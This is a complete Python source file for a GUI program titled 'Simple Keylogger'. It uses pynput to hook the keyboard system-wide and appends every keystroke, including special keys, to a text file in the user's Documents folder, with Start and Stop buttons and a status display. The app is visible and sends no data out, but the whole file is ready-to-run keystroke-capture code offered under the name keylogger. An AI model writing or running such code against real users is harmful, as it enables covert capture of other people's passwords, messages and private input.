
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard
import threading
import os

# Set log file path to user's Documents folder
log_file = os.path.join(os.path.expanduser("~"), "Documents", "key_log.txt")
logging = False
listener = None

def on_press(key):
    with open(log_file, "a", encoding="utf-8") as f:
        try:
            f.write(f"{key.char}")
        except AttributeError:
            f.write(f"[{key}]")

def start_logging():
    global logging, listener
    if not logging:
        logging = True
        listener = keyboard.Listener(on_press=on_press)
        listener.start()
        status_label.config(text="Status: Logging...", fg="green")

def stop_logging():
    global logging, listener
    if logging and listener:
        listener.stop()
        logging = False
        status_label.config(text="Status: Stopped", fg="red")

# --- GUI Setup ---
app = tk.Tk()
app.title("Keylogger")
app.geometry("400x220")
app.configure(bg="#f0f2f5")

header = tk.Label(app, text="Simple Keylogger", font=("Helvetica", 16, "bold"), bg="#f0f2f5", fg="#333")
header.pack(pady=10)

start_button = tk.Button(app, text="Start Logging", command=start_logging, bg="#4CAF50", fg="white", width=20, height=2)
start_button.pack(pady=5)

stop_button = tk.Button(app, text="Stop Logging", command=stop_logging, bg="#f44336", fg="white", width=20, height=2)
stop_button.pack(pady=5)

status_label = tk.Label(app, text="Status: Stopped", font=("Helvetica", 12), bg="#f0f2f5", fg="red")
status_label.pack(pady=10)

log_path_label = tk.Label(app, text=f"Log File: {log_file}", wraplength=380, font=("Helvetica", 9), bg="#f0f2f5", fg="#555")
log_path_label.pack(pady=5)

app.mainloop()
